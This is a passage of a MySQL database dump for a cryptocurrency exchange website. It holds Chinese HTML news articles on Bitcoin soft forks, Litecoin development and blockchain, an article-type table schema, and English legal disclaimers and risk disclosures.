sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	4、<strong>总结</strong>\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	有些人会认为实现软分叉，实现兼容，会很复杂，需要很多兼容设计，会需要很多代码。所有字段都已经详细定义好了，实现起来只能用现有的定义的组合会很困难。其实BIP9便是用已经定义好的版本号字段来实现投票软分叉的。而隔离验证将重新定义签名字段。不要因为困难，就否定其实施的可能性。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	其实现在隔离验证已经在8月份发布的Bitcoin Core 0.13.0首次包含了隔离验证代码，但并未正式激活而已。http://www.8btc.com/lighting-network-joseph &nbsp;“一旦隔离见证在比特币网络中激活，闪电网络就能使用。这就是说，在最初阶段，闪电网络应该只能用于小额支付，因为网络和软件要进行应力测试。目前，闪电网络正在比特币测试网络进行测试。”\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	软分叉方案离我们并不远，虽然困难，但聪明的开发者们已经基本实现了，且已经和正在进行大量的测试。万一有漏洞也是可以修复的，不会出大问题。而万一匆忙硬分叉扩容，导致币圈分裂了，那才是大问题。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	（写了整整半天，现在还没吃饭。请各位过目，可关注微信“Bite酱”交流。若有写错的地方请您一定指出，如果觉得对您有用，欢迎打赏点给我。)\r\n</p>\r\n<p style=\"text-indent:2em;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;color:gray;background-color:#FFFFFF;\">\r\n	（此文仅代表作者本人观点，不代表OFC立场）\r\n</p>', null, '1', 'bbb', '0', '1', '1', '0', '1447197369', '1476156783', '1');
INSERT INTO `movesay_article` VALUES ('13', '莱特币开发进度更新', null, '<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	随着莱特币内核开发的持续进行，又有两位成员通过了前期的训练，新加入到莱特币开发团队。一位是来自金山云的软件工程师孙鹏，（&nbsp;https://cn.linkedin.com/in/void-main&nbsp;），另一位是来自PP租车的技术经理杨帆（&nbsp;https://cn.linkedin.com/in/fancycedar&nbsp;）让我们欢迎莱特币开发团队又加入了两位优秀的新成员！另外，其他的几位候选人仍在进行严格紧张的训练，让我们耐心的等待他们的成长蜕变。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	孙鹏和杨帆两位都将会帮助李启威（Charlie&nbsp;Lee）完成Trezor钱包对于莱特币的支持项目，未来此项目的成果也可以应用到其他项目当中（关于项目的具体内容，用户可以参考目前&nbsp;Trezor钱包对于比特币的支持方式来类比了解）。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img alt=\"AAEAAQAAAAAAAAg8AAAAJGE5ZjIwZTIwLTcwNmUtNGViNi04NTJjLTk2MWVmODM1MmU5YQ\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_111125_4346_0.jpg\" style=\"height:auto;border:0px;\" />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	孙鹏是一位对尖端科技兴趣浓厚的全栈工程师。他是一位加入过两家创业公司，也有过合伙人经历的连续创业者，同时，他也热爱数学，并且着迷于莱特币的共识协议。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img alt=\"2964cc9\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_111125_7141_1.jpg\" style=\"height:auto;border:0px;\" />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	另一位新成员，杨帆，也是一位连续创业者，热衷于创造新的价值。杨帆在服务器端的开发和移动端开发都有着丰富的经验。他在四年前加入刚刚艰难起步的PP租车，四年间，PP租车已经成长为中国市场和新加坡市场上所占份额最大的P2P租车平台。他对于数字加密货币和莱特币的未来非常有信心，相信莱特币在全球范围内潜力无限。\r\n</p>\r\n<p style=\"text-indent:2em;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;color:gray;background-color:#FFFFFF;\">\r\n	（此文仅代表作者本人观点，不代表OFC立场）\r\n</p>', null, '1', 'bbb', '0', '1', '1', '0', '1447196898', '1476156695', '1');
INSERT INTO `movesay_article` VALUES ('14', '美国国防部计划采用区块链安全存储核武器等高度机密项目数据', null, '<div class=\"content_main\" style=\"margin:0px;padding:0px;font-size:14px;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<p style=\"text-indent:2em;\">\r\n		区块链技术在非金融行业的发展十分艰难，但似乎这项技术对军事发展至关重要。高级研究计划局（DARPA）是美国国防部（DoD）一个具有传奇色彩的研究部门。该部门目前正在大力投资区块链项目，旨在安全储存国防部内部数据，这些数据可能来源于核武器或军用卫星等高度机密项目。\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		<img alt=\"美国区块链\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_111110_1524_0.jpg\" title=\"点击查看原图\" style=\"height:auto;border:0px;\" /> \r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		使用区块链系统的目的归根结底就是要实现计算机安全中最重要的一环，即“信息完整性”。主要就是跟踪系统或数据的查看或修改记录。DARPA区块链项目经理蒂莫西•布赫（Timothy Booher）举了个例子：\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		（可以把数据看作一座城堡），保护数据安全的重点不在于在城堡外面修建高高的围墙，防止外来入侵者，而在于了解是否有人渗透在城堡内部，他们又做了些什么。\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		区块链是一个去中心化、不可更改的账簿。区块链能够永久记录网络或数据库访问历史，入侵者无法掩盖自己的行为。而DARPA追求的区块链系统将承担重要的情报工作，提醒管理者是否有黑客入侵或修改数据库，又或者是否有人在监视某个军事系统。Booher说：\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		只要是有武器的地方……数据完整性通常是极其重要的。所以说，核武器和卫星的指挥控制，甚至是所有指挥控制系统中，（信息完整性）都是不能忽视的。\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		今年9月，DARPA和计算机安全公司Galois签下了180万美元的合同。该公司的职责是通过形式验证（一个采用数学方法的计算机代码审查过程）的方式，审查Guardtime提供的区块链方案是否有效。成功通过形式验证的代码几乎不会被破解，因此形式验证也就成了DARPA安全计划中不可或缺的一部分。\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		如果本次形式验证进行顺利，DARPA则会考虑在军事领域使用区块链技术。Booher表示：\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		我们确实了解过（区块链技术）的大量应用。只要形式验证过后，证明该技术在安全方面的价值，我们就会开始（和国防部其它机构）召开一系列会议，讨论区块链的可行性。\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		区块链在军事系统的运用很可能会带动该技术在非金融领域的发展。2016年第一季度的区块链投资高达1.34亿美元。而这些获得投资的公司大多致力于金融行业。不过，据市场调研公司Gartner预计，信息安全将成为区块链技术的另一个代表性市场。去年，相关公司共获750亿美元投资，到了2019年，项目投资金融或将突破1080亿美元。\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		如今，企业和政治机构攻击事件频发，一个不可更改的，同时还能跟踪记录的系统自然会引起他们的注意。Booher说：\r\n	</p>\r\n	<p style=\"text-indent:2em;\">\r\n		我们希望能建立一个高度信任的系统……然后我们才能实现各种可能。希望士兵在驾驶军用车、飞机以及指挥卫星的时候，能够100%关注自己的任务。\r\n	</p>\r\n	<p style=\"text-indent:2em;color:gray;\">\r\n		（此文仅代表作者本人观点，不代表OFC立场）\r\n	</p>\r\n</div>', null, '1', 'bbb', '0', '1', '1', '0', '1447196898', '1476156545', '1');
INSERT INTO `movesay_article` VALUES ('18', '如何创建一个帐户 ', 'How to create an account ', '点击“注册”在页面顶部，并按照步骤。别担心，它是完全免费的！', 'Click on \'Register\' on the top of the page and follow the steps. Don\'t worry, it is absolutely free!', '1', 'ccc', '0', '1', '1', '0', '1447196898', '1476157360', '1');
INSERT INTO `movesay_article` VALUES ('1', '韩国宣布进行金融技术的改革', null, '<div style=\"text-align:left;\">\r\n	<br />\r\n<br />\r\n	<div style=\"text-align:center;\">\r\n		<img src=\"https://worldbull.com/files/temp/big/25_20161028_61578.jpg\" /><span style=\"line-height:1.5;\"></span>\r\n	</div>\r\n韩国金融服务委员会（FSC）会长严钟勇最近提出了一个很有前景的“金融科技发展路线图”。消息称，委员会取消了一些不合理的规则，现在正为金融科技（FinTech）技术加入而修改目前的系统。 严钟勇还进一步公开了金融服务委员会（FSC）的计划，计划将政策贷款从4.39亿提高到8.79亿。该计划的合作研究和测试已经开始。 这对比特币来说意味着什么？ 对于是否采用比特币技术，韩国一直采取中立的态度。虽然目前监管机构没有数字货币初创公司的具体法律，但监管机构也从未阻止他们的成长。 但由于韩国当局总想要找到对比特币的法律定义以及解决当前的税收问题，在“金融监管试验台”系统的帮助下，AML保证初创公司不会受到法律问题的困扰。 上述提到的系统，正如韩国媒体所说，允许金融技术（FinTech）初创公司在没有许可证的情况下测试系统。这意味着比特币公司至少可以在最初的测试阶段不受到监管。该系统进一步确保了会革新“了解你的客户”程序，这将对比特币交易有所帮助。 金融服务委员会确定了在2017年的第一季度前出台一部成熟的比特币管理方案。<br />\r\n<br />\r\n</div>', null, '1', 'aaa', '0', '1', '1', '0', '1477630578', '1476288000', '1');

-- ----------------------------
-- Table structure for movesay_article_type
-- ----------------------------
DROP TABLE IF EXISTS `movesay_article_type`;
CREATE TABLE `movesay_article_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET utf8 NOT NULL,
  `title` varchar(50) CHARACTER SET utf8 NOT NULL,
  `en_title` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `remark` varchar(50) CHARACTER SET utf8 NOT NULL,
  `index` varchar(50) CHARACTER SET utf8 NOT NULL,
  `footer` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `shang` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `en_content` text CHARACTER SET utf8,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_article_type
-- ----------------------------
INSERT INTO `movesay_article_type` VALUES ('1', 'us', 'Introduction', null, '行业资讯', '0', '1', 'aboutus', '<p style=\"color:#999999;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:center;text-indent:0px;background-color:#F9F9F9;\">\r\n	<br />\r\n</p>\r\n<p style=\"margin-left:0in;text-align:left;\">\r\n	<span style=\"font-size: 14px;\" color:white;\"=\"\">\r\n	<p class=\"MsoNormal\">\r\n		<span>MeUnite is a exchange that provide a\r\nplatform for every users to exchange their Cryptocurrencies by using P2P\r\nmethods. Users need no to deposit money to the exchange to trade. Users only\r\nneed register an account and transfer their cryptocurrencies into the exchange\r\nand trade with other users for FREE. When users need to buy cryptocurrencies\r\nfrom another users in exchange, they need to click “confirm trade” after they\r\nchoose one of the pending sell orders by other users, and bank in money and\r\nupload the resit to the specific seller with pending sell order. The sellers\r\nwill “confirm received money” and the cryptocurrencies will be transfer to the\r\nbuyer. MeUnite will never accept any FIAT CURRENCIES deposit into the exchange.\r\nMeUnite only deal with Cryptocurrencies in business.</span>\r\n	</p>\r\n</span>\r\n</p>\r\n<p style=\"color:#999999;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:center;text-indent:0px;background-color:#F9F9F9;\">\r\n	<br />\r\n</p>', null, '1', '1476096195', '1476096191', '1');
INSERT INTO `movesay_article_type` VALUES ('2', 'xiazai', '下载中心', null, '最新公告', '0', '1', '', '', null, '3', '0', '0', '1');
INSERT INTO `movesay_article_type` VALUES ('3', 'help', '帮助中心', null, '帮助中心', '0', '1', '', '', null, '2', '0', '0', '1');
INSERT INTO `movesay_article_type` VALUES ('4', 'aboutus', '关于我们', 'About US', '关于我们', '0', '1', '', '', '', '1', '1478707200', '1478707200', '1');
INSERT INTO `movesay_article_type` VALUES ('5', 'contact', '联系我们', null, '', '0', '1', 'aboutus', '<p class=\"contact-item\" style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	客服电话：400-888-8888\r\n</p>\r\n<p class=\"contact-item\" style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	联系邮箱：1111111@ofc.com\r\n</p>\r\n<p class=\"contact-item\" style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<br />', null, '2', '1476096419', '1476096420', '0');
INSERT INTO `movesay_article_type` VALUES ('6', 'join', '加入我们', null, '', '0', '1', 'aboutus', '<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">我们是行业的先驱者，</span> \r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">我们是一家国际化的公司。</span> \r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">从创业伊始的五人团队迅猛增长，</span> \r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">集团公司旗下10多个子公司遍布全球各地，</span> \r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">我们正在光速发展！</span> \r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">我们需要一群有梦想有追求的骚年，</span> \r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">如果你是这样的人，</span> \r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span style=\"font-size:14px;color:#000000;\">那就快来加入我们吧！</span> \r\n</p>\r\n<br class=\"Apple-interchange-newline\" />', null, '4', '1476096844', '1476096845', '0');
INSERT INTO `movesay_article_type` VALUES ('7', 'law', 'Legal notice', null, '', '0', '1', 'aboutus', '<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<b><span style=\"font-family:\"color:#333F51;\">Legal notice & disclaimer:</span></b>\r\n</p>\r\n<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<span style=\"font-size:12.0pt;font-family:宋体;\">(A) Imprint according to MEUNITE</span>\r\n</p>\r\n<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<span style=\"font-size:12.0pt;font-family:宋体;\">Anti-Spam Policy</span>\r\n</p>\r\n<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<span style=\"font-size:12.0pt;font-family:宋体;\">International anti-spam legislation and best practices in the industry\r\nrequire informed, opt-in consent to receiving commercial electronic messages; a\r\nmeaningful unsubscribe option for recipients; and, proper identification of\r\nmessage senders. MEUNITE needs your consent to communicate with you\r\nelectronically to establish and maintain a responsible commercial relationship\r\nwith you; to understand your needs and your eligibility for products and\r\nservices; to recommend particular products, services, and opportunities to you;\r\nto inform you about trading and financing features; to provide information to\r\nyou about developments and new products, including changes and enhancements to\r\nthe Site; to develop, enhance, and market products and services, and provide\r\nproducts and services to you; to process billing and collection of any fees; to\r\nconduct surveys and get feedback from you; to deliver products and services to\r\nyou; to provide you with news and other matters of general interest to you as a\r\ncustomer; and, to meet MEUNITE’s legal and regulatory requirements.</span>\r\n</p>\r\n<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<span style=\"font-size:12.0pt;font-family:宋体;\">Risk Disclosure Statement</span>\r\n</p>\r\n<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<span style=\"font-size:12.0pt;font-family:宋体;\">Trading and financing trades in Digital Tokens entails certain risks. This\r\nrisk disclosure statement cannot and does not disclose all risks and other\r\naspects involved in holding, trading, or engaging in financing or financed\r\ntransactions in Digital Tokens. Risks include, but are not limited to, the\r\nfollowing: Market Risk: The market for Digital Tokens is still new and\r\nuncertain. No-one should have funds invested in Digital Tokens or speculate in\r\nDigital Tokens that she is not prepared to lose entirely. Whether the market\r\nfor one or more Digital Tokens will move up or down, or whether a particular\r\nDitigal Token will lose all or substantially all of its value, is unknown. This\r\napplies both to traders that are going long and to traders that are shorting\r\nthe market. Participants should be cautious about holding Digital Tokens.\r\nLiquidity Risk: Markets for Digital Tokens have varying degrees of liquidity.\r\nSome are quite liquid while others may be thinner. Thin markets can amplify\r\nvolatility. There is never a guarantee that there will be an active market for\r\none to sell, buy, or trade Digital Tokens or products derived from or ancillary\r\nto them. Legal Risk: The legal status of certain Digital Tokens may be\r\nuncertain. This can mean that the legality of holding or trading them is not\r\nalways clear. Whether and how one or more Digital Tokens constitute property,\r\nor assets, or rights of any kind may also seem unclear. Participants are\r\nresponsible for knowing and understanding how Digital Tokens will be addressed,\r\nregulated, and taxed under applicable law. Exchange Risk (Counterparty Risk):\r\nHaving Digital Tokens on deposit or with any third party in a custodial\r\nrelationship has attendant risks. These risks include security breaches, risk\r\nof contractual breach, and risk of loss. Participants should be wary of\r\nallowing third parties to hold their property for any reason. Trading Risk: In\r\naddition to liquidity risks, values in any digital token marketplace are\r\nvolatile and can shift quickly. Participants in any Digital Tokens market are\r\nwarned that they should pay close attention to their position and holdings, and\r\nhow they may be impacted by sudden and adverse shifts in trading and other\r\nmarket activities. Risks Associated with Financing Activities: When you finance\r\na purchase or sale of Digital Tokens on a peer-to-peer basis, you run the risk\r\nof losing your provided financing. Similarly, when you accept financing to\r\nenter a trading agreement, you accept the risk of not being able to repay that\r\nfinancing (e.g., if the market price of the Digital Token you purchased with\r\nthe financing falls). Participants should know all of the terms of any\r\ncontracts they enter and how their trading strategies and other market and risk\r\nfactors can affect their financing obligations.</span>\r\n</p>\r\n<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<span style=\"font-size:12.0pt;font-family:宋体;\">Law Enforcement Requests Policy</span>\r\n</p>\r\n<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n	<span style=\"font-size:12.0pt;font-family:宋体;\">From time to time, MEUNITE\r\nreceives information requests about its customers from law enforcement agencies\r\naround the world. This page is here to provide you and law enforcement with\r\ninformation about how these requests are processed. When MEUNITE is contacted,\r\nlaw enforcement is generally interested in two types of data: information about\r\ncustomers’ identities and information about their trading activities. When\r\ninformation requests are received, MEUNITE requires that it be accompanied by\r\nappropriate legal process. This can vary from place to place. For example,\r\nproduction orders, search warrants, and subpoenas may all amount to legal\r\nprocess. MEUNITE reviews each order to determine that it has valid legal basis\r\nand that any response is narrowly tailored to ensure that only the data to\r\nwhich law enforcement is entitled is provided. MEUNITE also reserves the right\r\nto make disclosures to authorities in order to protect itself, any Associates,\r\nand customers. MEUNITE welcomes inquiries from law enforcement agencies about\r\nits policies and procedures. Please contact MeUnite at support@meunite.com.</span>\r\n</p>\r\n<br />', null, '4', '1476096731', '1476096733', '1');
INSERT INTO `movesay_article_type` VALUES ('8', 'game', ' Disclaimer', null, '', '0', '1', 'help', '<p style=\"color:#333333;font-family:\'Open Sans Regular\', \'Open Sans\', \'Helvetica Neue\', Helvetica, Arial, \'PingFang SC\', \'Microsoft Yahei\', 微软雅黑, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p class=\"MsoNormal\" style=\"margin-left:0cm;background:white;\">\r\n	This statement applies to the operation of the Internet trading platform to provide or run services (including web sites and mobile applications). Internet trading platform, the following collectively referred to as \"the United States.\"<br />\r\nPlease ensure that you read and understand the following statements before using the Internet service.<br />\r\nNo trust responsibility, no investment proposal, no investment to attract<br />\r\nThe United States has no fiduciary responsibility for customers using its services. In addition, the Intranet expressly reserves the right to change the prices or product composition of its services at any time.<br />\r\nThe information provided by the Service does not constitute an investment offer or solicitation for the purchase or disposal of financial assets. Investors can not rely on this information to make investment decisions.<br />\r\nNo warranty, no liability<br />\r\nWhile the United States endeavors to provide accurate and timely information on its Web site, it does not imply that the United States Network provides security for any material that it provides.<br />\r\nWithout prejudice to the above paragraphs, the Internet does not guarantee the following:<br />\r\nThe information provided by the Internet service will remain in perpetuity or permanent.<br />\r\nThe information provided by the Internet service is complete, true, accurate, current or not misleading.<br />\r\nYou should not delay seeking legal advice, disregarding legal advice, or starting or stopping any legal action due to information provided by the Internet service.<br />\r\nresponsibility<br />\r\nThis Legal Notice does not in any way limit any liability of the United States network beyond applicable law or excludes any liability of the United States network that may not be outside the applicable law.<br />\r\nlink<br />\r\nLinks to third-party websites are provided for convenience only. The Intranet does not express any opinion on the content of any third-party web site and expressly disclaims any responsibility or liability for any third-party information. If you use the links provided in the Internet service to any other website, you are entirely at your own risk.<br />\r\ntrademark<br />\r\nAll trademarks mentioned are the property of, or available under, the network.<br />\r\ncopyright<br />\r\nInformation on the Internet service and its inclusion and references are provided for informational purposes only. Any reproduction, forwarding or other use is strictly prohibited. You should seek out the business development contact form and provide the relevant request on the Internet page.\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"color:#333333;font-family:\'Open Sans Regular\', \'Open Sans\', \'Helvetica Neue\', Helvetica, Arial, \'PingFang SC\', \'Microsoft Yahei\', 微软雅黑, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span class=\"Apple-converted-space\"></span> \r\n</p>', null, '5', '1476097143', '1476097145', '1');
INSERT INTO `movesay_article_type` VALUES ('9', 'protocol', 'disclaimer', null, '', '0', '1', 'aboutus', '<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:16px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#F5F5F5;\">\r\n	<span style=\"font-family:\'Microsoft YaHei\';font-size:13px;\">\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<b><span style=\"font-family:&quot;color:#333F51;\">Legal notice &amp; disclaimer:</span></b>\r\n	</p>\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<span style=\"font-size:12.0pt;font-family:宋体;\">(A) Imprint according to MEUNITE</span>\r\n	</p>\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<span style=\"font-size:12.0pt;font-family:宋体;\">Anti-Spam Policy</span>\r\n	</p>\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<span style=\"font-size:12.0pt;font-family:宋体;\">International anti-spam legislation and best practices in the industry\r\nrequire informed, opt-in consent to receiving commercial electronic messages; a\r\nmeaningful unsubscribe option for recipients; and, proper identification of\r\nmessage senders. MEUNITE needs your consent to communicate with you\r\nelectronically to establish and maintain a responsible commercial relationship\r\nwith you; to understand your needs and your eligibility for products and\r\nservices; to recommend particular products, services, and opportunities to you;\r\nto inform you about trading and financing features; to provide information to\r\nyou about developments and new products, including changes and enhancements to\r\nthe Site; to develop, enhance, and market products and services, and provide\r\nproducts and services to you; to process billing and collection of any fees; to\r\nconduct surveys and get feedback from you; to deliver products and services to\r\nyou; to provide you with news and other matters of general interest to you as a\r\ncustomer; and, to meet MEUNITE’s legal and regulatory requirements.</span>\r\n	</p>\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<span style=\"font-size:12.0pt;font-family:宋体;\">Risk Disclosure Statement</span>\r\n	</p>\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<span style=\"font-size:12.0pt;font-family:宋体;\">Trading and financing trades in Digital Tokens entails certain risks. This\r\nrisk disclosure statement cannot and does not disclose all risks and other\r\naspects involved in holding, trading, or engaging in financing or financed\r\ntransactions in Digital Tokens. Risks include, but are not limited to, the\r\nfollowing: Market Risk: The market for Digital Tokens is still new and\r\nuncertain. No-one should have funds invested in Digital Tokens or speculate in\r\nDigital Tokens that she is not prepared to lose entirely. Whether the market\r\nfor one or more Digital Tokens will move up or down, or whether a particular\r\nDitigal Token will lose all or substantially all of its value, is unknown. This\r\napplies both to traders that are going long and to traders that are shorting\r\nthe market. Participants should be cautious about holding Digital Tokens.\r\nLiquidity Risk: Markets for Digital Tokens have varying degrees of liquidity.\r\nSome are quite liquid while others may be thinner. Thin markets can amplify\r\nvolatility. There is never a guarantee that there will be an active market for\r\none to sell, buy, or trade Digital Tokens or products derived from or ancillary\r\nto them. Legal Risk: The legal status of certain Digital Tokens may be\r\nuncertain. This can mean that the legality of holding or trading them is not\r\nalways clear. Whether and how one or more Digital Tokens constitute property,\r\nor assets, or rights of any kind may also seem unclear. Participants are\r\nresponsible for knowing and understanding how Digital Tokens will be addressed,\r\nregulated, and taxed under applicable law. Exchange Risk (Counterparty Risk):\r\nHaving Digital Tokens on deposit or with any third party in a custodial\r\nrelationship has attendant risks. These 